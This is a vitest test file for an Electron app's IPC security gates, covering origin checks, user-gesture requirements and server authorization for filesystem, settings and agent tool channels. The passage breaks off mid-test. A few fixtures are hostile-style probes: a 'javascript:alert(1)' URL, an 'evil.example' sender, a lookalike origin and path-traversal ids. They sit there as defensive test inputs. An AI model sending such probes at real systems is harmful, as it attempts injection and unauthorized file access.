import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { PASTE_LIMITS } from '@sim/utils/paste'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

vi.mock('electron', () => import('@/test/electron-mock'))

// Stubbed so the gating tests never read the developer's real Chrome profile
// or reach their Keychain — the importer's own behaviour is covered by
// src/main/browser-import.
vi.mock('@/main/browser-import', () => ({
  isChromeImportSupported: vi.fn(() => true),
  listChromeImportProfiles: vi.fn(async () => [{ id: 'Default', label: 'Person 1' }]),
  importChromeCookies: vi.fn(async () => ({ cookiesImported: 3, cookiesSkipped: 1 })),
  importChromePasswords: vi.fn(async () => ({
    passwordsAdded: 2,
    passwordsUpdated: 0,
    passwordsSkipped: 1,
  })),
}))

vi.mock('@/main/browser-search/suggestions', () => ({
  getSearchSuggestions: vi.fn(async () => ['sim ai workflow']),
}))

const { terminalThemeProfile } = vi.hoisted(() => ({
  terminalThemeProfile: {
    id: 'iterm2:ocean',
    name: 'Ocean',
    source: 'iterm2' as const,
    palette: {
      background: '#101010',
      foreground: '#f0f0f0',
      cursor: '#ffffff',
      selectionBackground: '#264f78',
      black: '#000000',
      red: '#cc0000',
      green: '#00cc00',
      yellow: '#cccc00',
      blue: '#0000cc',
      magenta: '#cc00cc',
      cyan: '#00cccc',
      white: '#cccccc',
      brightBlack: '#555555',
      brightRed: '#ff5555',
      brightGreen: '#55ff55',
      brightYellow: '#ffff55',
      brightBlue: '#5555ff',
      brightMagenta: '#ff55ff',
      brightCyan: '#55ffff',
      brightWhite: '#ffffff',
    },
  },
}))

vi.mock('@/main/terminal-themes', () => ({
  findCachedTerminalThemeProfile: vi.fn((profileId: string) =>
    profileId === terminalThemeProfile.id ? terminalThemeProfile : null
  ),
  listTerminalThemeProfiles: vi.fn(async () => [terminalThemeProfile]),
}))

const { mockCoordinator } = vi.hoisted(() => ({
  mockCoordinator: {
    noteFormState: vi.fn(),
    noteNavigation: vi.fn(),
    forget: vi.fn(),
    refreshAvailability: vi.fn(),
    showChooser: vi.fn(async () => true),
    listFillOptions: vi.fn(async () => [
      {
        id: 'c1',
        origin: 'https://example.com',
        username: 'ada',
        createdAt: '',
        updatedAt: '',
        source: 'chrome',
      },
    ]),
    fillCredential: vi.fn(async () => true),
  },
}))

vi.mock('@/main/browser-credentials', () => ({
  revealCredential: vi.fn(async () => 'hunter2'),
  copyCredential: vi.fn(async () => true),
  credentialsAvailable: vi.fn(() => true),
  listCredentials: vi.fn(async () => [
    {
      id: 'c1',
      origin: 'https://example.com',
      username: 'ada',
      createdAt: '',
      updatedAt: '',
      source: 'chrome',
    },
  ]),
  forgetCredential: vi.fn(async () => []),
  forgetAllCredentials: vi.fn(async () => []),
  clearCredentials: vi.fn(async () => {}),
  initFillCoordinator: vi.fn(() => mockCoordinator),
  fillCoordinator: vi.fn(() => mockCoordinator),
}))

// A browser tab is identified by WebContents, not by URL — the pages it hosts
// are arbitrary websites.
vi.mock('@/main/browser-agent/registry', () => ({
  registerAgentWebContents: vi.fn(),
  isAgentWebContents: vi.fn(
    (contents: { isBrowserTab?: boolean } | null) => contents?.isBrowserTab === true
  ),
}))

import type { DesktopPreferences } from '@sim/desktop-bridge'
import type { WebContents } from 'electron'
import { clipboard, ipcMain, shell } from 'electron'
import * as browserDriver from '@/main/browser-agent/driver'
import * as browserSession from '@/main/browser-agent/session'
import {
  copyCredential,
  credentialsAvailable,
  forgetAllCredentials,
  forgetCredential,
  listCredentials,
  revealCredential,
} from '@/main/browser-credentials'
import {
  importChromeCookies,
  importChromePasswords,
  listChromeImportProfiles,
} from '@/main/browser-import'
import { getSearchSuggestions } from '@/main/browser-search/suggestions'
import { trackInputActivity } from '@/main/input-activity'
import { type IpcDeps, openMicrophoneSettings, registerIpcHandlers } from '@/main/ipc'
import { LocalFilesystemService } from '@/main/local-filesystem'
import { TerminalRegistry } from '@/main/terminal/registry'
import { findCachedTerminalThemeProfile, listTerminalThemeProfiles } from '@/main/terminal-themes'

const APP = 'https://sim.ai'
const ESC = '\u001b'
const BEL = '\u0007'

const DEFAULT_DESKTOP_PREFERENCES: DesktopPreferences = {
  notificationsEnabled: true,
  notificationSounds: true,
  notificationsOnlyWhenUnfocused: true,
  launchAtLogin: false,
  autoDownloadUpdates: true,
  trayEnabled: true,
  browserEnabled: true,
  terminalEnabled: true,
  browserTheme: 'app',
  browserDefaultZoom: 100,
  browserDownloadDirectory: '/tmp/downloads',
  terminalTheme: 'app',
  terminalDefaultZoom: 100,
}

type InputListener = (event: unknown, input: { type: string }) => void

interface FakeSender {
  session?: { fetch: (url: string, init?: RequestInit) => Promise<Response> }
  /** Marks a sender the mocked registry recognises as a browser tab. */
  isBrowserTab?: boolean
  isDestroyed?: () => boolean
  on?: (channel: string, listener: InputListener) => void
}

type Handler = (
  event: {
    senderFrame: { url: string; executeJavaScript?: (source: string) => Promise<unknown> } | null
    sender?: FakeSender
  },
  ...args: unknown[]
) => unknown

function collectHandlers() {
  const invoke = new Map<string, Handler>()
  const on = new Map<string, Handler>()
  for (const [channel, handler] of vi.mocked(ipcMain.handle).mock.calls) {
    invoke.set(channel as string, handler as Handler)
  }
  for (const [channel, handler] of vi.mocked(ipcMain.on).mock.calls) {
    on.set(channel as string, handler as Handler)
  }
  return { invoke, on }
}

/**
 * A sender registered with the main-process input tracker, so a test can grant
 * it a real gesture with `press`. User activation is no longer read out of the
 * renderer, so a fixture cannot fake it by stubbing `executeJavaScript`.
 */
function trackedSender() {
  const listeners: InputListener[] = []
  const sender = {
    session: {
      fetch: vi.fn(async () => {
        throw new Error('not authorized')
      }),
    },
    isDestroyed: () => false,
    on: (channel: string, listener: InputListener) => {
      if (channel === 'input-event') listeners.push(listener)
    },
  }
  trackInputActivity(sender as unknown as WebContents)
  return {
    sender,
    /** Delivers one real click, satisfying both input-recency gates. */
    press: () => {
      for (const listener of listeners) listener({}, { type: 'mouseDown' })
    },
  }
}

const rejectedSender = () => trackedSender().sender
const fileSender = rejectedSender()
const appSender = rejectedSender()
const evilSender = rejectedSender()
const activeSender = trackedSender()
const activeChooserSender = trackedSender()
const fileEvent = {
  senderFrame: { url: 'file:///app/static/offline.html' },
  sender: fileSender,
}
const appEvent = { senderFrame: { url: `${APP}/workspace/ws1` }, sender: appSender }
const activeAppEvent = {
  senderFrame: { url: `${APP}/workspace/ws1` },
  sender: activeSender.sender,
}
/** Same origin, but the main process has never seen this renderer get input. */
const inactiveAppEvent = {
  senderFrame: { url: `${APP}/workspace/ws1` },
  sender: rejectedSender(),
}
const evilEvent = { senderFrame: { url: 'https://evil.example/page' }, sender: evilSender }
/** The chooser anchors a native menu, so it needs a sender with a window. */
const FAKE_WINDOW = { id: 'main-window' }
const activeChooserEvent = {
  senderFrame: { url: `${APP}/workspace/ws1` },
  sender: activeChooserSender.sender,
}

describe('registerIpcHandlers', () => {
  let deps: IpcDeps

  beforeEach(() => {
    // Frozen so the input-recency windows cannot lapse mid-test: the gates read
    // wall-clock, and a loaded machine pausing between this press and an
    // assertion would flip them closed for reasons unrelated to the test.
    vi.useFakeTimers()
    activeSender.press()
    activeChooserSender.press()
    vi.mocked(ipcMain.handle).mockClear()
    vi.mocked(ipcMain.on).mockClear()
    vi.mocked(shell.openExternal).mockClear()
    vi.mocked(listChromeImportProfiles).mockClear()
    vi.mocked(importChromeCookies).mockClear()
    vi.mocked(importChromePasswords).mockClear()
    vi.mocked(getSearchSuggestions).mockClear()
    vi.mocked(findCachedTerminalThemeProfile).mockClear()
    vi.mocked(listTerminalThemeProfiles).mockClear()
    vi.mocked(credentialsAvailable).mockClear()
    vi.mocked(listCredentials).mockClear()
    vi.mocked(forgetCredential).mockClear()
    vi.mocked(forgetAllCredentials).mockClear()
    vi.mocked(revealCredential).mockClear()
    vi.mocked(copyCredential).mockClear()
    mockCoordinator.noteFormState.mockClear()
    mockCoordinator.showChooser.mockClear()
    mockCoordinator.listFillOptions.mockClear()
    mockCoordinator.fillCredential.mockClear()
    deps = {
      appOrigin: () => APP,
      allowHttpLocalhost: () => false,
      retryLoad: vi.fn(),
      beginOAuthConnect: vi.fn(async () => true),
      localFilesystem: new LocalFilesystemService({
        chooseDirectory: vi.fn(async () => null),
      }),
      terminal: new TerminalRegistry(),
      scopeEvents: {
        activateBrowser: vi.fn(),
        activateTerminal: vi.fn(),
        sendBrowser: vi.fn(),
        sendTerminal: vi.fn(),
      },
      settings: {
        getPreferences: vi.fn(() => DEFAULT_DESKTOP_PREFERENCES),
        setPreference: vi.fn(),
        setBrowserSearchSuggestionsEnabled: vi.fn(),
        setAppearancePreference: vi.fn(),
        setBrowserDefaultZoom: vi.fn(),
        setTerminalDefaultZoom: vi.fn(),
        selectTerminalProfile: vi.fn(),
        chooseBrowserDownloadDirectory: vi.fn(async () => DEFAULT_DESKTOP_PREFERENCES),
        notify: vi.fn(() => true),
        applySystemPreferences: vi.fn(),
      },
      getWindowState: vi.fn(() => ({ isFullScreen: true })),
      getWindowForContents: vi.fn(() => FAKE_WINDOW as never),
      browserPanel: {
        activateScope: vi.fn(),
        setBounds: vi.fn(),
        setFocused: vi.fn(),
        captureSnapshot: vi.fn(async () => ({
          dataUrl: 'data:image/png;base64,c2lt',
          tabId: 'tab-1',
          zoomPercent: 100,
          scopeId: 'chat-a',
        })),
        setOccluded: vi.fn(() => true),
      },
      updates: {
        getState: vi.fn(() => ({ status: 'ready' as const, version: '1.2.3' })),
        check: vi.fn(),
        install: vi.fn(),
      },
      server: {
        open: vi.fn(),
        getConfiguration: vi.fn(() => ({ origin: APP, defaultOrigin: APP, isSimCloud: true })),
        setOrigin: vi.fn(async () => ({ ok: true as const, origin: APP, unchanged: true })),
      },
    }
    registerIpcHandlers(deps)
  })

  afterEach(() => {
    vi.useRealTimers()
  })

  it('validates open-external URLs regardless of sender', async () => {
    const { invoke } = collectHandlers()
    expect(await invoke.get('desktop:open-external')?.(evilEvent, 'https://docs.sim.ai')).toBe(true)
    expect(await invoke.get('desktop:open-external')?.(appEvent, 'javascript:alert(1)')).toBe(false)
    expect(await invoke.get('desktop:open-external')?.(appEvent, 42)).toBe(false)
    expect(shell.openExternal).toHaveBeenCalledTimes(1)
  })

  it('opens microphone privacy settings only for the trusted app origin', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:open-microphone-settings')

    expect(await handler?.(evilEvent)).toBe(false)
    expect(await handler?.(appEvent)).toBe(process.platform === 'darwin')
    expect(shell.openExternal).toHaveBeenCalledTimes(process.platform === 'darwin' ? 1 : 0)
  })

  it('uses fixed native microphone settings URLs', async () => {
    await expect(openMicrophoneSettings('darwin')).resolves.toBe(true)
    expect(shell.openExternal).toHaveBeenLastCalledWith(
      'x-apple.systempreferences:com.apple.preference.security?Privacy_Microphone'
    )

    await expect(openMicrophoneSettings('win32')).resolves.toBe(true)
    expect(shell.openExternal).toHaveBeenLastCalledWith('ms-settings:privacy-microphone')
    await expect(openMicrophoneSettings('linux')).resolves.toBe(false)
  })

  it('keeps live search suggestions behind the app origin and privacy preference', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-agent:search-suggestions')

    expect(await handler?.(evilEvent, 'sim ai')).toEqual([])

    expect(await handler?.(appEvent, 'sim ai')).toEqual(['sim ai workflow'])
    expect(getSearchSuggestions).toHaveBeenCalledWith('sim ai')

    vi.mocked(deps.settings.getPreferences).mockReturnValue({
      ...DEFAULT_DESKTOP_PREFERENCES,
      browserSearchSuggestionsEnabled: false,
    })
    expect(await handler?.(appEvent, 'sim ai')).toEqual([])
  })

  it('restricts the OAuth connect handoff to the app origin', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:oauth-connect')
    expect(await handler?.(evilEvent, 'slack')).toBe(false)
    expect(await handler?.(fileEvent, 'slack')).toBe(false)
    expect(deps.beginOAuthConnect).not.toHaveBeenCalled()
    expect(await handler?.(appEvent, 42)).toBe(false)
    expect(await handler?.(appEvent, 'slack')).toBe(true)
    expect(deps.beginOAuthConnect).toHaveBeenCalledWith('slack', {})

    // Connects carry workspace/credential or exact-draft scope; malformed
    // scopes (wrong types, unsafe ids) are rejected before the handoff.
    expect(
      await handler?.(appEvent, 'slack', {
        workspaceId: 'ws1',
        credentialId: 'cred_1',
        draftId: 'draft_1',
        chatAttemptId: 'attempt_1',
      })
    ).toBe(true)
    expect(deps.beginOAuthConnect).toHaveBeenCalledWith('slack', {
      workspaceId: 'ws1',
      credentialId: 'cred_1',
      draftId: 'draft_1',
      chatAttemptId: 'attempt_1',
    })
    expect(await handler?.(appEvent, 'slack', { workspaceId: 'ws/../evil' })).toBe(false)
    expect(await handler?.(appEvent, 'slack', { draftId: '../wrong' })).toBe(false)
    expect(await handler?.(appEvent, 'slack', { chatAttemptId: '../wrong' })).toBe(false)
    expect(await handler?.(appEvent, 'slack', 'not-an-object')).toBe(false)
  })

  it('restricts the updates surface to the app origin', async () => {
    const { invoke, on } = collectHandlers()
    const getState = invoke.get('desktop:updates:get-state')
    expect(await getState?.(evilEvent)).toEqual({ status: 'idle' })
    expect(await getState?.(appEvent)).toEqual({ status: 'ready', version: '1.2.3' })

    on.get('desktop:updates:check')?.(evilEvent)
    on.get('desktop:updates:install')?.(evilEvent)
    expect(deps.updates.check).not.toHaveBeenCalled()
    expect(deps.updates.install).not.toHaveBeenCalled()

    on.get('desktop:updates:check')?.(appEvent)
    on.get('desktop:updates:install')?.(appEvent)
    expect(deps.updates.check).toHaveBeenCalledTimes(1)
    expect(deps.updates.install).toHaveBeenCalledTimes(1)
  })

  it('restricts local filesystem access to the app origin', async () => {
    const { invoke } = collectHandlers()
    expect(
      await invoke.get('desktop:local-filesystem')?.(evilEvent, { operation: 'list_mounts' })
    ).toMatchObject({ ok: false, code: 'ACCESS_DENIED' })
    expect(
      await invoke.get('desktop:local-filesystem')?.(appEvent, { operation: 'list_mounts' })
    ).toEqual({ ok: true, data: { mounts: [] } })
  })

  it('requires an active user gesture for granting or revoking folder access', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:local-filesystem')

    expect(await handler?.(inactiveAppEvent, { operation: 'mount_directory' })).toMatchObject({
      ok: false,
      code: 'ACCESS_DENIED',
      error: expect.stringContaining('explicit user click'),
    })
    expect(await handler?.(activeAppEvent, { operation: 'mount_directory' })).toMatchObject({
      ok: true,
      data: { cancelled: true, mount: null },
    })
    expect(
      await handler?.(inactiveAppEvent, { operation: 'reveal_mount', uri: 'localfs://mount-1/' })
    ).toMatchObject({
      ok: false,
      code: 'ACCESS_DENIED',
      error: expect.stringContaining('explicit user click'),
    })
  })

  it('requires server authorization for every privileged filesystem tool request', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:local-filesystem')
    const handle = vi.spyOn(deps.localFilesystem, 'handle')

    expect(
      await handler?.(appEvent, {
        operation: 'read',
        uri: 'localfs://mount-1/README.md',
        requestId: 'tool-1',
      })
    ).toMatchObject({
      ok: false,
      code: 'ACCESS_DENIED',
      error: expect.stringContaining('authorized pending Copilot tool call'),
    })
    expect(handle).not.toHaveBeenCalled()

    const fetchAuthorization = vi.fn(async () =>
      Response.json({
        chatId: 'chat-1',
        toolName: 'read',
        args: { path: 'user-local/Project--mount-1/README.md' },
      })
    )
    const authorizedEvent = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender: { session: { fetch: fetchAuthorization } },
    }
    vi.spyOn(deps.localFilesystem, 'isAuthorizedClientToolRequest').mockReturnValueOnce(true)
    handle.mockResolvedValueOnce({ ok: true, data: { forgotten: false } })

    await expect(
      handler?.(authorizedEvent, {
        operation: 'read',
        uri: 'localfs://mount-1/README.md',
        requestId: 'tool-1',
      })
    ).resolves.toEqual({ ok: true, data: { forgotten: false } })
    expect(fetchAuthorization).toHaveBeenCalledWith(
      `${APP}/api/desktop/tool/authorize`,
      expect.objectContaining({
        method: 'POST',
        credentials: 'include',
        body: JSON.stringify({ toolCallId: 'tool-1' }),
      })
    )
  })

  it('restricts desktop settings to the app origin and validates mutations', async () => {
    const { invoke } = collectHandlers()
    const get = invoke.get('desktop:settings:get')
    const set = invoke.get('desktop:settings:set')
    const setAppearance = invoke.get('desktop:settings:set-appearance')
    const setBrowserDefaultZoom = invoke.get('desktop:settings:set-browser-default-zoom')
    const setTerminalDefaultZoom = invoke.get('desktop:settings:set-terminal-default-zoom')
    const notify = invoke.get('desktop:settings:notify')

    expect(await get?.(evilEvent)).toBeNull()
    expect(await get?.(appEvent)).toMatchObject({ notificationsEnabled: true })

    await set?.(evilEvent, 'notificationsEnabled', false)
    await set?.(appEvent, 'not-a-setting', false)
    await set?.(appEvent, 'notificationsEnabled', 'no')
    expect(deps.settings.setPreference).not.toHaveBeenCalled()

    await set?.(appEvent, 'notificationsEnabled', false)
    expect(deps.settings.setPreference).toHaveBeenCalledWith('notificationsEnabled', false)

    await setAppearance?.(evilEvent, 'browserTheme', 'dark')
    await setAppearance?.(appEvent, 'not-a-setting', 'dark')
    await setAppearance?.(appEvent, 'browserTheme', 'sepia')
    expect(deps.settings.setAppearancePreference).not.toHaveBeenCalled()

    await setAppearance?.(appEvent, 'browserTheme', 'dark')
    await setAppearance?.(appEvent, 'terminalTheme', 'app')
    expect(vi.mocked(deps.settings.setAppearancePreference).mock.calls).toEqual([
      ['browserTheme', 'dark'],
      ['terminalTheme', 'app'],
    ])

    await setBrowserDefaultZoom?.(evilEvent, 125)
    await setBrowserDefaultZoom?.(appEvent, 123)
    expect(deps.settings.setBrowserDefaultZoom).not.toHaveBeenCalled()

    await setBrowserDefaultZoom?.(appEvent, 125)
    expect(deps.settings.setBrowserDefaultZoom).toHaveBeenCalledWith(125)

    await setTerminalDefaultZoom?.(evilEvent, 125)
    await setTerminalDefaultZoom?.(appEvent, 123)
    expect(deps.settings.setTerminalDefaultZoom).not.toHaveBeenCalled()

    await setTerminalDefaultZoom?.(appEvent, 125)
    expect(deps.settings.setTerminalDefaultZoom).toHaveBeenCalledWith(125)

    expect(await notify?.(evilEvent, { title: 'Done', body: 'Ready' })).toBe(false)
    expect(await notify?.(appEvent, { title: '', body: 'Ready' })).toBe(false)
    expect(
      await notify?.(appEvent, { title: 'Done', body: 'Ready', route: '//evil.example' })
    ).toBe(false)
    expect(deps.settings.notify).not.toHaveBeenCalled()

    expect(
      await notify?.(appEvent, {
        title: 'Task complete',
        body: 'Sim finished responding.',
        route: '/workspace/ws1/chat/c1',
      })
    ).toBe(true)
    expect(deps.settings.notify).toHaveBeenCalledWith({
      title: 'Task complete',
      body: 'Sim finished responding.',
      route: '/workspace/ws1/chat/c1',
    })
  })

  it('lists profiles and selects one only from an active app interaction', async () => {
    const { invoke } = collectHandlers()
    const list = invoke.get('terminal-themes:list-profiles')
    const selectProfile = invoke.get('terminal-themes:select-profile')

    expect(await list?.(evilEvent)).toEqual([])
    expect(listTerminalThemeProfiles).not.toHaveBeenCalled()

    const profiles = await list?.(appEvent)
    expect(profiles).toEqual([
      expect.objectContaining({ id: 'iterm2:ocean', name: 'Ocean', source: 'iterm2' }),
    ])

    expect(await selectProfile?.(inactiveAppEvent, 'iterm2:ocean')).toBeNull()
    expect(deps.settings.selectTerminalProfile).not.toHaveBeenCalled()

    await selectProfile?.(activeAppEvent, 'missing')
    expect(deps.settings.selectTerminalProfile).not.toHaveBeenCalled()

    await selectProfile?.(activeAppEvent, 'iterm2:ocean')
    expect(deps.settings.selectTerminalProfile).toHaveBeenCalledWith(
      expect.objectContaining({ id: 'iterm2:ocean', name: 'Ocean' })
    )
  })

  it('opens the browser download-folder picker only from an active app interaction', async () => {
    const { invoke } = collectHandlers()
    const choose = invoke.get('desktop:settings:choose-browser-download-directory')

    expect(await choose?.(evilEvent)).toBeNull()
    expect(await choose?.(inactiveAppEvent)).toBeNull()
    expect(deps.settings.chooseBrowserDownloadDirectory).not.toHaveBeenCalled()

    await expect(choose?.(activeAppEvent)).resolves.toMatchObject({
      browserDownloadDirectory: '/tmp/downloads',
    })
    expect(deps.settings.chooseBrowserDownloadDirectory).toHaveBeenCalledTimes(1)
  })

  it('reports native fullscreen state only to the app origin', async () => {
    const { invoke } = collectHandlers()
    const getWindowState = invoke.get('desktop:window-state:get')

    expect(await getWindowState?.(evilEvent)).toEqual({ isFullScreen: false })
    expect(await getWindowState?.(appEvent)).toEqual({ isFullScreen: true })
    expect(deps.getWindowState).toHaveBeenCalledWith(appSender)
  })

  it('restricts shell-control channels to bundled local pages', () => {
    const { on } = collectHandlers()

    on.get('offline:retry')?.(appEvent)
    expect(deps.retryLoad).not.toHaveBeenCalled()
    on.get('offline:retry')?.(fileEvent)
    expect(deps.retryLoad).toHaveBeenCalledWith(fileSender)
  })

  it('registers every channel the preload bridge invokes or sends', () => {
    // The two files share ~20 channel names as bare string literals with
    // nothing tying them together, so a typo on either side is a silently dead
    // feature that type-checks, lints, and ships.
    const { invoke, on } = collectHandlers()
    const registered = new Set([...invoke.keys(), ...on.keys()])
    const preloadSource = readFileSync(
      fileURLToPath(new URL('../preload/index.ts', import.meta.url)),
      'utf8'
    )
    const used = [
      ...new Set(
        [...preloadSource.matchAll(/ipcRenderer\.(?:invoke|send)\(\s*'([^']+)'/g)].map(
          (match) => match[1]
        )
      ),
    ]

    expect(used.length).toBeGreaterThan(0)
    expect(used.filter((channel) => !registered.has(channel))).toEqual([])
  })

  it('compares the sender by parsed origin, not by prefix', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:settings:get')

    // A lookalike host is a prefix of the app origin, so a `startsWith` gate
    // is one missing trailing slash away from admitting it.
    const lookalike = { senderFrame: { url: `${APP}.evil.example/workspace/ws1` } }
    expect(await handler?.(lookalike)).toBeNull()

    // Origin equality also normalizes the default port, which a prefix
    // comparison rejects even though it is the same origin.
    const explicitPort = { senderFrame: { url: 'https://sim.ai:443/workspace/ws1' } }
    expect(await handler?.(explicitPort)).toMatchObject({ notificationsEnabled: true })
  })

  it('handles a missing senderFrame safely', async () => {
    const { invoke } = collectHandlers()
    expect(await invoke.get('desktop:oauth-connect')?.({ senderFrame: null }, 'slack')).toBe(false)
    expect(deps.beginOAuthConnect).not.toHaveBeenCalled()
  })

  it('restricts browser-agent tool execution to the app origin and known tools', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-agent:execute-tool')

    expect(
      await handler?.(evilEvent, 'tool-1', 'browser_navigate', { url: 'https://x.dev' })
    ).toMatchObject({
      ok: false,
      error: expect.stringContaining('not allowed'),
    })
    expect(await handler?.(fileEvent, 'tool-1', 'browser_navigate', {})).toMatchObject({
      ok: false,
    })
    expect(await handler?.(appEvent, 'tool-1', 'browser_snapshot', {})).toMatchObject({
      ok: false,
      error: expect.stringContaining('authorized pending Copilot tool call'),
    })

    const fetchAuthorization = vi.fn(async () =>
      Response.json({ chatId: 'chat-1', toolName: 'browser_snapshot', args: {} })
    )
    const authorizedEvent = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender: { session: { fetch: fetchAuthorization } },
    }
    // The server-persisted name must match the renderer's requested name.
    expect(
      await handler?.(authorizedEvent, 'tool-1', 'browser_navigate', {
        url: 'https://evil.example',
      })
    ).toMatchObject({
      ok: false,
      error: expect.stringContaining('authorized pending Copilot tool call'),
    })
    // An authorized call reaches the driver with the server-persisted args
    // (which reports its own tool-level failure because no session exists).
    expect(
      await handler?.(authorizedEvent, 'tool-1', 'browser_snapshot', {
        ignored: 'renderer cannot choose params',
      })
    ).toMatchObject({
      ok: false,
      error: expect.stringContaining('No page is open yet'),
    })
    expect(fetchAuthorization).toHaveBeenCalledWith(
      `${APP}/api/desktop/tool/authorize`,
      expect.objectContaining({ body: JSON.stringify({ toolCallId: 'tool-1' }) })
    )
  })

  it('routes exact browser-tool cancellation without waiting for authorization', async () => {
    const { invoke } = collectHandlers()
    const cancel = vi.spyOn(browserDriver, 'cancelTool').mockReturnValue(true)
    const cancelActive = vi.spyOn(browserDriver, 'cancelActiveTool').mockReturnValue(true)
    const handler = invoke.get('browser-agent:cancel-tool')
    const activeHandler = invoke.get('browser-agent:cancel-active-tool')

    await expect(handler?.(appEvent, 'tool-1', 'chat-1')).resolves.toBe(true)
    expect(cancel).toHaveBeenCalledWith('chat-1', 'tool-1')
    await expect(activeHandler?.(appEvent, 'chat-reloaded')).resolves.toBe(true)
    expect(cancelActive).toHaveBeenCalledWith('chat-reloaded')
    await expect(handler?.(evilEvent, 'tool-2', 'chat-1')).resolves.toBe(false)
    await expect(activeHandler?.(evilEvent, 'chat-reloaded')).resolves.toBe(false)
    expect(cancel).toHaveBeenCalledTimes(1)
    expect(cancelActive).toHaveBeenCalledTimes(1)
    cancel.mockRestore()
    cancelActive.mockRestore()
  })

  it('rejects a browser tool authorized after its scope cancellation boundary', async () => {
    const { invoke } = collectHandlers()
    const executeHandler = invoke.get('browser-agent:execute-tool')
    const cancelActiveHandler = invoke.get('browser-agent:cancel-active-tool')
    let resolveAuthorization: (response: Response) => void = () => {}
    const fetchAuthorization = vi.fn(
      () =>
        new Promise<Response>((resolve) => {
          resolveAuthorization = resolve
        })
    )
    const delayedEvent = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender: { session: { fetch: fetchAuthorization } },
    }

    const execution = executeHandler?.(
      delayedEvent,
      'tool-delayed-authorization',
      'browser_open_tab',
      {},
      'chat-delayed-authorization'
    )
    await Promise.resolve()
    await cancelActiveHandler?.(delayedEvent, 'chat-delayed-authorization')
    resolveAuthorization(
      Response.json({
        chatId: 'chat-delayed-authorization',
        toolName: 'browser_open_tab',
        args: {},
      })
    )

    await expect(execution).resolves.toMatchObject({
      ok: false,
      error: expect.stringContaining('cancelled before it started'),
    })
  })

  it('routes terminal tools by the server-authorized chat, not renderer scope', async () => {
    const { invoke } = collectHandlers()
    const executeTool = vi.spyOn(deps.terminal, 'executeTool').mockResolvedValue({ ok: true })
    const fetchAuthorization = vi.fn(async () =>
      Response.json({
        chatId: 'chat-a',
        toolName: 'terminal',
        args: { operation: 'list', args: {} },
      })
    )
    const authorizedEvent = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender: { session: { fetch: fetchAuthorization } },
    }

    await expect(
      invoke.get('terminal:execute-tool')?.(
        authorizedEvent,
        'tool-1',
        'terminal',
        { operation: 'run', args: { command: 'false' } },
        'chat-b'
      )
    ).resolves.toEqual({ ok: true })

    expect(executeTool).toHaveBeenCalledWith('chat-a', 'tool-1', 'list', {})
  })

  it('ignores browser-agent panel actions from outside the app origin', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:panel-action')
    // Malformed and foreign-origin actions are dropped without throwing.
    expect(() => handler?.(evilEvent, { action: 'reload' })).not.toThrow()
    expect(() => handler?.(appEvent, 'not-an-object')).not.toThrow()
    expect(() => handler?.(appEvent, { action: 'reload' })).not.toThrow()
  })

  it('restricts browser-tab pinning to typed app-origin messages', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:set-tab-pinned')

    expect(() => handler?.(evilEvent, '1', true)).not.toThrow()
    expect(() => handler?.(appEvent, 1, true)).not.toThrow()
    expect(() => handler?.(appEvent, '1', 'yes')).not.toThrow()
    expect(() => handler?.(appEvent, '1', true)).not.toThrow()
  })

  it('restricts browser-tab context menus to typed app-origin messages', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:show-tab-context-menu')

    expect(() => handler?.(evilEvent, '1')).not.toThrow()
    expect(() => handler?.(appEvent, 1)).not.toThrow()
    expect(() => handler?.(appEvent, '1')).not.toThrow()
  })

  it('restricts browser-tab reordering to typed app-origin messages', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:reorder-tab')

    expect(() => handler?.(evilEvent, '1', 0)).not.toThrow()
    expect(() => handler?.(appEvent, 1, 0)).not.toThrow()
    expect(() => handler?.(appEvent, '1', '0')).not.toThrow()
    expect(() => handler?.(appEvent, '1', Number.NaN)).not.toThrow()
    expect(() => handler?.(appEvent, '1', 0)).not.toThrow()
  })

  it('restricts browser-panel focus updates to boolean app-origin messages', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:set-panel-focused')

    expect(() => handler?.(evilEvent, true, 'chat-a')).not.toThrow()
    expect(() => handler?.(appEvent, 'yes', 'chat-a')).not.toThrow()
    expect(() => handler?.(appEvent, true, 'chat-a')).not.toThrow()
    expect(deps.browserPanel.setFocused).toHaveBeenCalledWith(appSender, true, 'chat-a')
  })

  it('routes validated browser-panel bounds with the originating app window sender', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:set-panel-bounds')
    const bounds = { x: 100, y: 50, width: 800, height: 600 }

    handler?.(evilEvent, bounds, null, 'chat-a')
    handler?.(appEvent, { ...bounds, width: Number.NaN }, null, 'chat-a')
    expect(deps.browserPanel.setBounds).not.toHaveBeenCalled()

    handler?.(appEvent, bounds, null, 'chat-a')
    handler?.(appEvent, null, null, 'chat-a')
    expect(deps.browserPanel.setBounds).toHaveBeenNthCalledWith(
      1,
      appSender,
      bounds,
      undefined,
      'chat-a'
    )
    expect(deps.browserPanel.setBounds).toHaveBeenNthCalledWith(
      2,
      appSender,
      null,
      undefined,
      'chat-a'
    )
  })

  it('captures and swaps the browser panel only for its active app scope', async () => {
    const { invoke } = collectHandlers()

    await expect(
      invoke.get('browser-agent:capture-panel-snapshot')?.(activeAppEvent, 'chat-a')
    ).resolves.toMatchObject({ tabId: 'tab-1', zoomPercent: 100 })
    expect(deps.browserPanel.captureSnapshot).toHaveBeenCalledWith(activeSender.sender, 'chat-a')

    await expect(
      invoke.get('browser-agent:set-panel-occluded')?.(activeAppEvent, true, 'chat-a')
    ).resolves.toBe(true)
    expect(deps.browserPanel.setOccluded).toHaveBeenCalledWith(
      activeSender.sender,
      true,
      'chat-a',
      false
    )

    await expect(
